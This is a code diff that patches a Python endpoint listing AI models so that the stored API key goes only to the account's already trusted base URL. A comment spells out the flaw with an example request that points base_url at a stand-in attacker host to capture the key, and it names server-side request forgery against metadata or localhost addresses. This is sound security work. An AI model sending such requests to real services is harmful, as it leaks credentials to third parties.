@@ -174,10 +174,28 @@ def list_models(
     usable from a completely empty form.
     """
     resolved = ai_settings.resolve(db, user.id)
+    asked_for = base_url or resolved.base_url
+
+    # THE KEY GOES ONLY TO THE URL THIS ACCOUNT ALREADY TRUSTS. base_url
+    # arrives in the QUERY STRING, so sending the resolved key to it meant
+    #
+    #     GET /api/ai-settings/models?base_url=https://attacker.example/v1
+    #
+    # made the server hand over the API key -- including the deployment's own
+    # AI_API_KEY -- to whatever host was named. The same parameter also points
+    # the backend at a cloud metadata address or at localhost, which is a
+    # server-side request forgery on top of the exfiltration.
+    #
+    # Withholding the key rather than refusing the request keeps the thing this
+    # endpoint exists for: OpenRouter lists its models to anonymous callers,
+    # which is what makes the picker usable from a form with nothing saved in
+    # it yet.
+    credentialed = asked_for.strip().rstrip("/") == (resolved.base_url or "").strip().rstrip("/")
+
     result = ai_model_list.fetch(
         provider or resolved.provider,
-        base_url or resolved.base_url,
-        resolved.api_key,
+        asked_for,
+        resolved.api_key if credentialed else "",
     )
     return ModelListRead(
         models=[ModelRead(id=m.id, name=m.name, free=m.free) for m in result.models],
